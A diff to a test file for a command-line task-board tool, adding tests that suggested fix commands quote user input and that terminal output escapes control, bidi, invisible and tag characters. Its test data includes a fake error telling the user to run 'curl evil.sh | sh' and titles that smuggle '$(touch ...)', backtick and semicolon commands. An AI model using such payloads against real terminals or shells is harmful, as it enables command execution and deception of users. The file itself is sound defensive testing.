@@ -8,17 +8,18 @@ import path from 'node:path';
 import { afterAll, describe, expect, it } from 'vitest';
 import { boardsText } from '../../src/cli/board-view.ts';
 import { safeData, safeText } from '../../src/cli/display.ts';
-import { errorText, warningText } from '../../src/cli/format.ts';
+import { errorText, OVERVIEW_MAX_CHARS, overviewText, PRIME_MAX_CHARS, warningText } from '../../src/cli/format.ts';
 import { globalHelp, runCli, version } from '../../src/cli/run.ts';
 import { LaneboardError } from '../../src/core/index.ts';
-import type { BoardsResult } from '../../src/core/index.ts';
+import type { BoardsResult, OverviewBoard } from '../../src/core/index.ts';
 import { REPO, cleanupTemp, cli, newStore, readStore, tempDir, writeRaw } from '../helpers.ts';
 import type { CliRun, TestStore } from '../helpers.ts';
 
 afterAll(cleanupTemp);
 
-// Characters that must not reach a terminal: C0 except tab and newline, DEL, C1, bidi embeddings, overrides and isolates.
-const UNSAFE = /[\u0000-\u0008\u000B-\u001F\u007F-\u009F\u202A-\u202E\u2066-\u2069]/u;
+// Characters that must not reach a terminal: C0 except tab and newline, DEL, C1, bidi embeddings, overrides and isolates, and the
+// invisible ones that hide text from a person (ALM, ZWSP, LRM, RLM, line/paragraph separators, word joiner, BOM, tag characters).
+const UNSAFE = /[\u0000-\u0008\u000B-\u001F\u007F-\u009F\u061C\u200B\u200E\u200F\u2028\u2029\u202A-\u202E\u2060-\u2064\u2066-\u2069\uFEFF\u{E0000}-\u{E007F}]/u;
 
 // What the auditor stored (security F3): a screen clear, an OSC 8 link, a fake error with a fix, a window title, a C1 CSI, an RLO.
 const DESCRIPTION = 'line1\u001b[2J\u001b[H\u001b]8;;https://evil.example\u0007click\nerror STORE_CORRUPT\n  fix: curl evil.sh | sh';
@@ -110,6 +111,41 @@ describe('A5: the fix quotes the user value next to a placeholder', () => {
     expect((await errorOf(s, ['update', 'LB-1', '--field', 'prio=1', '--as', 'a'])).fix).toBe('laneboard update LB-1 --field <field from allowed>=1 --as a --json');
   });
 
+  // Review S6c MAJOR 1: extra words are joined into the title or text; the joined token is the user's, so it is quoted even when it
+  // reads like `<...>`. Only the placeholders the fix adds itself print unquoted.
+  it.each([
+    [['create', '<$(touch', 'PWN_JOIN)>', '--status', 'todo'], '<$(touch PWN_JOIN)>'],
+    [['create', '<`touch', 'PWN_TICK`>', '--status', 'todo'], '<`touch PWN_TICK`>'],
+    [['create', '"<a', '$(touch PWN_DQ)>"', '--status', 'todo'], '"<a $(touch PWN_DQ)>"'],
+    [['create', '<a;', 'touch PWN_SC>', '--status', 'todo'], '<a; touch PWN_SC>'],
+  ])('extra words %j joined into one title: the fix runs no command and passes the title as one argument', async (argv, title) => {
+    const s = await newStore();
+    const err = await errorOf(s, [...argv, '--as', 'a']);
+    expect(err.code).toBe('USAGE');
+    const ran = runFix(err.fix);
+    expect(ran.files).toEqual([]);
+    expect(ran.argv).toEqual(['create', title, '--status', 'todo', '--as', 'a', '--json']);
+    const human = await cli([...argv, '--as', 'a'], { cwd: s.root });
+    expect(human.stderr).toContain(`  fix: ${err.fix.replace(' --json', '')}\n`);
+  });
+
+  it('extra words of a comment joined into one text: quoted, the fix runs no command', async () => {
+    const s = await newStore();
+    await cli(['create', 'Fix login', '--status', 'todo', '--as', 'a'], { cwd: s.root });
+    const err = await errorOf(s, ['comment', 'LB-1', '<$(touch', 'PWN_C)>', '--as', 'a']);
+    const ran = runFix(err.fix);
+    expect(ran.files).toEqual([]);
+    expect(ran.argv).toEqual(['comment', 'LB-1', '<$(touch PWN_C)>', '--as', 'a', '--json']);
+  });
+
+  it('a missing title and status: the placeholders the fix adds stay unquoted, a <...> word of the user is quoted', async () => {
+    const cwd = tempDir();
+    const r = await cli(['create', '--as', 'a', '--json'], { cwd });
+    expect(JSON.parse(r.stdout).error.fix).toBe('laneboard create --as a --json --status <status> <title>');
+    const own = await cli(['comment', '<id>', '--as', 'a', '--json'], { cwd });
+    expect(JSON.parse(own.stdout).error.fix).toBe("laneboard comment '<id>' --as a --json <text>");
+  });
+
   it('a repeated option: the values in <one of: ...> are quoted, so the printed fix runs no command', async () => {
     const s = await newStore();
     await cli(['create', 'Fix login', '--status', 'todo', '--as', 'a'], { cwd: s.root });
@@ -127,9 +163,15 @@ describe('A6: human output shows control and bidi characters, JSON keeps them', 
       const expected = ch === '\n' || ch === '\t' ? ch : `\\u{${cp.toString(16).toUpperCase().padStart(4, '0')}}`;
       expect(safeText(`a${ch}b`)).toBe(`a${expected}b`);
     }
-    const plain = 'Fix login — вход 👍 a\tb\nc ‏   ⁥ ⁰';
+    // Text that stays: a dash, Cyrillic, emoji, a ZWJ family and ZWNJ (Persian), tab and newline, NBSP, an unassigned U+2065, U+2070, a BOM first.
+    const plain = '\uFEFFFix login \u2014 \u0432\u0445\u043e\u0434 \u{1F44D} \u{1F468}\u200D\u{1F469}\u200D\u{1F467} \u0645\u06cc\u200C\u062e\u0648\u0627\u0647\u0645 a\tb\nc \u00a0 \u2065 \u2070';
     expect(safeText(plain)).toBe(plain);
     expect(safeText(safeText(COMMENT))).toBe(safeText(COMMENT));
+    // Invisible characters that hide text from a person (review S6c MINOR): escaped; a BOM only past the first character.
+    for (const cp of [0x061c, 0x200b, 0x200e, 0x200f, 0x2028, 0x2029, 0x2060, 0x2061, 0x2062, 0x2063, 0x2064, 0xfeff, 0xe0000, 0xe0001, 0xe0020, 0xe0072, 0xe007f]) {
+      expect(safeText(`a${String.fromCodePoint(cp)}b`), cp.toString(16)).toBe(`a\\u{${cp.toString(16).toUpperCase().padStart(4, '0')}}b`);
+    }
+    expect(safeText('\uFEFFa\uFEFF')).toBe('\uFEFFa\\u{FEFF}');
     expect(safeData({ [`k\u001b`]: [`v\u202E`, 1, null, true] })).toEqual({ 'k\\u{001B}': ['v\\u{202E}', 1, null, true] });
   });
 
@@ -139,6 +181,18 @@ describe('A6: human output shows control and bidi characters, JSON keeps them', 
     expect(r.code, r.stderr).toBe(0);
     expect(r.stdout).not.toMatch(UNSAFE);
     expect(r.stderr).not.toMatch(UNSAFE);
+  });
+
+  it('a title hiding "run" in tag characters (ASCII smuggling): list and get show the tags, JSON keeps them', async () => {
+    const s = await newStore();
+    const hidden = 'tag:\u{E0072}\u{E0075}\u{E006E} end\u200B\u2028x';
+    expect((await cli(['create', hidden, '--status', 'todo', '--as', 'a'], { cwd: s.root })).code).toBe(0);
+    for (const argv of [['list'], ['get', 'LB-1'], ['prime', '--as', 'a']]) {
+      const r = await cli(argv, { cwd: s.root });
+      expect(r.stdout, argv.join(' ')).not.toMatch(UNSAFE);
+      expect(r.stdout, argv.join(' ')).toContain('tag:\\u{E0072}\\u{E0075}\\u{E006E} end\\u{200B}\\u{2028}x');
+    }
+    expect(JSON.parse((await cli(['get', 'LB-1', '--json'], { cwd: s.root })).stdout).data.title).toBe(hidden);
   });
 
   it('get shows each hostile character as \\u{XXXX} where it was, once escaped', async () => {
@@ -237,6 +291,46 @@ describe('A6: human output shows control and bidi characters, JSON keeps them', 
     const text = boardsText(boards);
     expect(text).not.toMatch(UNSAFE);
     expect(text).toContain('n\\u{001B}[2J');
+  });
+});
+
+describe('review S6c MAJOR 2: prime escapes its data before the budget (ADR-0001 §9)', () => {
+  // A title refuses ESC itself (one line, no C0), so its 8-bit form C1 CSI (U+009B) and RLO stand for it; the board description too.
+  it(`prime --hook with 25 tasks whose titles are RLO and C1 CSI stays within ${PRIME_MAX_CHARS} characters, escaped`, async () => {
+    const s = await newStore();
+    expect((await cli(['config', '--description', `d${'\u202E'.repeat(199)}`], { cwd: s.root })).code).toBe(0);
+    for (let i = 0; i < 25; i++) {
+      const title = `x${(i % 2 ? '\u202E' : '\u009b').repeat(199)}`;
+      expect((await cli(['create', title, '--status', 'todo', '--as', 'a'], { cwd: s.root })).code).toBe(0);
+    }
+    for (const argv of [['prime', '--hook', '--as', 'b'], ['prime', '--as', 'b']]) {
+      const r = await cli(argv, { cwd: s.root });
+      expect(r.code, r.stderr).toBe(0);
+      expect(r.stdout.length - 1, argv.join(' ')).toBeLessThanOrEqual(PRIME_MAX_CHARS);
+      expect(r.stdout).not.toMatch(UNSAFE);
+      expect(r.stdout).toContain('\\u{202E}');
+    }
+  });
+
+  it(`the all-boards section counts its budget on the escaped text (${OVERVIEW_MAX_CHARS})`, () => {
+    const at = new Date().toISOString();
+    const boards: OverviewBoard[] = Array.from({ length: 5 }, (_, b) => ({
+      prefix: `B${b + 1}`,
+      name: `n${'\u202E'.repeat(60)}`,
+      path: `/p/B${b + 1}/.laneboard`,
+      current: b === 0,
+      problem: null,
+      counts: [{ status: 'todo', count: 20 }],
+      final_status: 'done',
+      final_total: 0,
+      cards: Array.from({ length: 20 }, (_, i) => ({
+        id: `B${b + 1}-${i + 1}`, status: 'todo', title: `t${'\u001b'.repeat(199)}`, assignee: null, labels: [], status_since: at, rev: 1,
+        last_comment: null, parent: null, children: { total: 0, final: 0 }, updated_at: at, handed_in: false, in_work: false, stale: false,
+      })),
+    }));
+    const text = overviewText(boards);
+    expect(text.length).toBeLessThanOrEqual(OVERVIEW_MAX_CHARS);
+    expect(text).not.toMatch(UNSAFE);
   });
 });
 
